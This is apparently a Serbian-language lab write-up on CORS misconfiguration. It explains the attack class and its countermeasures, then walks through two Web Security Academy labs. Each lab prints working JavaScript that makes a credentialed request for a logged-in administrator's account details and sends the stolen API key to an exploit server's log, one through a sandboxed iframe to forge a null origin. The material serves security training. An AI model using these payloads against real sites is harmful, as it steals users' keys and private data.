### 2. Cross-Origin Resource Sharing (CORS) ranjivosti

**Objašnjenje klase napada:**
CORS (Cross-Origin Resource Sharing) je mehanizam veb-pregledača koji omogućava kontrolisan pristup resursima koji se nalaze van izvornog domena. On predstavlja kontrolisano "opuštanje" izuzetno restriktivne SOP (*Same-Origin Policy*) polise, koja inače spriječava jedan domen da čita podatke sa drugog. CORS koristi HTTP zaglavlja (poput `Access-Control-Allow-Origin`) da definiše kojim eksternim domenima je dozvoljeno čitanje odgovora i da li se pritom smiju slati sesijski kolačići. Napadi bazirani na CORS-u nastaju kada je ova polisa na serveru loše konfigurisana, omogućavajući zlonamjernim domenima da zaobiđu SOP zaštitu.

**Uticaj iskorišćenja:**
Ukoliko je korisnik prijavljen na ranjivu aplikaciju, a zatim posjeti zlonamjerni sajt, napadač može natjerati pregledač žrtve da u pozadini pošalje CORS zahtjev ka ranjivoj aplikaciji (zajedno sa kolačićima žrtve). Zbog loše konfiguracije, pregledač će dozvoliti zlonamjernom sajtu da pročita odgovor. Na ovaj način napadač može ukrasti osjetljive privatne podatke žrtve, API ključeve, CSRF tokene ili čak dobiti pristup internim resursima organizacije.

**Ranjivosti u softveru koje su dozvolile napad:**
Veb-serveri često griješe u implementaciji CORS-a kako bi olakšali integraciju različitih servisa, a najčešći uzroci su:
* **Slijepo reflektovanje `Origin` zaglavlja:** Kako bi izbjegli održavanje liste dozvoljenih domena, programeri podese server da jednostavno pročita `Origin` zaglavlje iz zahtjeva klijenta i iskopira ga u `Access-Control-Allow-Origin` zaglavlje odgovora, dajući tako pristup bilo kom sajtu na internetu.
* **Greške u parsiranju domena (loše bijele liste):** Korišćenje nesigurnih regularnih izraza ili pravila za provjeru URL-ova (npr. dozvoljavanje svih domena koji se *završavaju* sa `normal-website.com`, što napadač zaobilazi registracijom domena `hackersnormal-website.com`).
* **Dozvoljavanje `null` origin-a:** Serveri se ponekad konfigurišu da dozvole vrijednost `null` u `Origin` zaglavlju (često zbog lokalnog razvoja). Napadači ovo eksploatišu generišući zahtjeve iz *sandboxed* ifrejmova (gdje pregledač šalje `Origin: null`).
* **Povjerenje u nesigurne protokole:** Ukoliko siguran (HTTPS) sajt u svojoj CORS polisi dozvoli pristup svom nesigurnom (HTTP) poddomenu, napadač koji presreće saobraćaj može kompromitovati TLS enkripciju.

**Primjerene kontramere:**
* **Striktna definicija dozvoljenih domena (Whitelist):** `Access-Control-Allow-Origin` zaglavlje smije da sadrži isključivo tačne nazive pouzdanih sajtova. Nikada ne treba dinamički i bez provjere reflektovati origin koji pošalje klijent.
* **Zabrana `null` vrijednosti:** Izbjegavati konfigurisanje zaglavlja `Access-Control-Allow-Origin: null`, s obzirom na to da se ono lako lažira iz zlonamjernih dokumenata.
* **Izbjegavanje "wildcard" (`*`) konfiguracija u intranetu:** Samo postojanje aplikacije u privatnoj mrežnoj zoni nije dovoljna zaštita ako unutrašnji korisnici pristupaju javnom internetu.
* **Slojevita zaštita:** CORS definiše ponašanje pregledača i nije zamjena za serversku bezbednost. Server uvijek mora da provjerava autentifikaciju, autorizaciju i vlasništvo nad podacima, nezavisno od CORS zaglavlja.

### Lab 1: CORS vulnerability with basic origin reflection (Težina: Zeleni)

**Cilj zadatka:** Aplikacija posjeduje nesigurnu CORS konfiguraciju jer slijepo vjeruje svim eksternim domenima (reflektuje vrijednost `Origin` zaglavlja). Cilj je napisati JavaScript kod koji koristi CORS da preuzme privatni API ključ administratora, isporučiti ga putem Exploit servera i uspješno ga podnijeti kao rješenje.

**Metodologija i koraci rješavanja:**

1. **Prijava na sistem i praćenje saobraćaja:**
   Prvi korak je bio autentifikacija na aplikaciju korišćenjem obezbjeđenih kredencijala za testnog korisnika (`wiener:peter`).
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153507" src="https://github.com/user-attachments/assets/112f7be0-a7e1-4956-8313-8a99205fcb12" />

   Nakon prijave, otvoren je korisnički profil gdje se prikazuje API ključ. U alatu Burp Suite (tab HTTP history) praćen je saobraćaj i identifikovan je HTTP `GET` zahtjev ka putanji `/accountDetails` koji u odgovoru vraća korisničke podatke, uključujući API ključ.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153546" src="https://github.com/user-attachments/assets/91e2ac7c-4047-484b-9de1-16640e0bc069" />

2. **Potvrda CORS ranjivosti (Origin Reflection):**
   Zahtjev je proslijeđen u alat **Repeater** radi testiranja konfiguracije. U HTTP zahtjev je ručno dodato zaglavlje `Origin: https://zli-haker.com` kako bi se simulirao zahtjev sa drugog domena.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153601" src="https://github.com/user-attachments/assets/19a6a092-0f89-474b-8cf2-82836a5da4f2" />
 
   Server je obradio zahtjev i u odgovoru vratio HTTP zaglavlja `Access-Control-Allow-Origin: https://zli-haker.com` i `Access-Control-Allow-Credentials: true`. Ovim je direktno potvrđeno da server slijepo reflektuje bilo koji unijeti `Origin` i pritom dozvoljava slanje sesijskih kolačića. Ovo omogućava eksternim sajtovima da čitaju privatne podatke ulogovanih korisnika.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153643" src="https://github.com/user-attachments/assets/816ecc15-77cf-44ae-a786-4cadeee8128e" />

3. **Priprema i isporuka zlonamjerne skripte (Exploit):**

   Kako bi se ranjivost eksploatisala na administratoru, korišćen je ugrađeni Exploit server. 
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 153732" src="https://github.com/user-attachments/assets/4d6e7547-5dba-40bd-813d-d7072f8be7e0" />

   U tijelo (Body) Exploit servera ubačen je sljedeći JavaScript kod:
   ````html
   <script>
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','[https://0ad9001b04ba59dd81eec9f700940026.web-security-academy.net/accountDetails',true](https://0ad9001b04ba59dd81eec9f700940026.web-security-academy.net/accountDetails',true));
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='/log?key='+this.responseText;
       };
   </script>
````

Skripta šalje asinhroni `GET` zahtjev ka ranjivom endpointu (uz slanje kolačića žrtve zahvaljujući `withCredentials = true`), preuzima odgovor koji sadrži API ključ i proslijeđuje ga nazad na Exploit server kroz URL parametar. Skripta je sačuvana (Store) i isporučena žrtvi (Deliver exploit to victim).

<img width="1920" height="1080" alt="Screenshot 2026-04-12 155510" src="https://github.com/user-attachments/assets/5a1464c6-2235-4575-aeae-3307036e9ae5" />

4.  **Krađa API ključa i rješavanje laboratorije:**
    Otvaranjem "Access log" sekcije na Exploit serveru, pregledani su zahtjevi. Evidentiran je HTTP `GET` zahtjev koji je izvršio pregledač žrtve, a u čijem se URL-u nalazi ukradeni JSON objekat sa administratorskim API ključem.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 160003" src="https://github.com/user-attachments/assets/7584c26b-e305-4466-a138-d781341fcc60" />

   API ključ je iskopiran i unijet u polje za rešenje (Submit solution).

<img width="1920" height="1080" alt="Screenshot 2026-04-12 160156" src="https://github.com/user-attachments/assets/2b82812d-efbb-48a3-920e-24081239f925" />

   Sistem je prihvatio ključ, čime je potvrđena uspješna eksploatacija ranjivosti, a laboratorija je riješena.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 160205" src="https://github.com/user-attachments/assets/25d3e5f9-e015-49cd-ba1c-f45cb33dc4fa" />

### Lab 2: CORS vulnerability with trusted null origin (Težina: Zeleni)

**Cilj zadatka:** Aplikacija posjeduje nesigurnu CORS konfiguraciju jer eksplicitno vjeruje `null` vrijednosti u `Origin` zaglavlju. Cilj je konstruisati JavaScript napad unutar izolovanog (sandboxed) ifrejma kako bi se generisao `Origin: null` zahtjev, ukrao privatni API ključ administratora i uspješno podnio kao rješenje.

**Metodologija i koraci rješavanja:**

1. **Prijava na sistem i praćenje saobraćaja:**
   Proces je započet prijavom na aplikaciju korišćenjem testnih korisničkih kredencijala (`wiener:peter`).
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162206" src="https://github.com/user-attachments/assets/02555f2e-c603-49c4-9305-7d73bc6253c8" />

   Otvaranjem korisničkog profila, u Burp Suite alatu (tab HTTP history) zabilježen je HTTP `GET` zahtjev ka putanji `/accountDetails`, koji u svom odgovoru vraća privatne korisničke podatke (uključujući i API ključ). Ovaj zahtjev u originalnom obliku ne sadrži `Origin` zaglavlje.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162228" src="https://github.com/user-attachments/assets/d921d8c8-13f8-4649-b3cf-5bc1ffe0dad0" />

2. **Potvrda ranjivosti (Vjerovanje null origin-u):**
   Zahtjev je proslijeđen u alat **Repeater**. Kako bismo testirali ponašanje servera, ručno je dodato novo zaglavlje `Origin: null`.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162241" src="https://github.com/user-attachments/assets/547a62f9-27e8-4a6b-9674-7c91474ba9b4" />

   Slanjem ovako modifikovanog zahtjeva, server je odgovorio sa zaglavljima `Access-Control-Allow-Origin: null` i `Access-Control-Allow-Credentials: true`. Ovo potvrđuje ozbiljnu ranjivost – server je spreman da podijeli podatke o ulogovanom korisniku sa bilo kojim dokumentom koji se predstavlja kao `null` origin.
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162433" src="https://github.com/user-attachments/assets/8b927b51-aacc-43c0-8968-875a4233040a" />

3. **Priprema i isporuka zlonamjerne skripte (Sandboxed Iframe):**
   Za eksploataciju je iskorišćen ugrađeni Exploit server. 
   
<img width="1920" height="1080" alt="Screenshot 2026-04-12 162600" src="https://github.com/user-attachments/assets/f0c2abb6-2b13-4d76-b1a0-ef53e111866d" />

   Pošto browseri automatski dodjeljuju `null` origin zahtjevima koji potiču iz izolovanih okruženja, u tijelo (Body) Exploit servera je ubačen HTML kod sa `iframe` elementom koji sadrži atribut `sandbox`. Unutar njega je definisana JavaScript skripta koja upućuje zahtjev za čitanje API ključa:
   
   ````html
   <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','[https://0a09006f032e121380ba49da00140033.web-security-academy.net/accountDetails',true](https://0a09006f032e121380ba49da00140033.web-security-academy.net/accountDetails',true));
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='[https://exploit-0a37004f039d1275806c483a01cf006a.exploit-server.net/log?key='+this.responseText](https://exploit-0a37004f039d1275806c483a01cf006a.exploit-server.net/log?key='+this.responseText);
       };
   </script>"></iframe>
````

Skripta je sačuvana (Store) i isporučena (Deliver exploit to victim), čime je administrator natjeran da učita ovaj zlonamjerni ifrejm.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162622" src="https://github.com/user-attachments/assets/02514326-24f5-4692-aa1a-e4684c0715d4" />

4.  **Krađa API ključa i rješavanje laboratorije:**
    Na Exploit serveru je otvoren "Access log". Evidentiran je novi log zapis u kom se jasno vidi HTTP zahtjev koji sadrži JSON objekat sa ukradenim API ključem administratora.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162646" src="https://github.com/user-attachments/assets/369195de-557e-4e82-8229-2506ad811109" />

   Ključ je iskopiran i proslijeđen aplikaciji kroz opciju "Submit solution".

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162711" src="https://github.com/user-attachments/assets/a493fc3b-5cac-42a7-abbb-34ce6f6524c8" />

   Sistem je prihvatio ključ, uspješno ovjerio rješenje i laboratorija je time zvanično riješena.

<img width="1920" height="1080" alt="Screenshot 2026-04-12 162721" src="https://github.com/user-attachments/assets/b9af813f-a1e7-48ec-aefa-2bd3a48546da" />





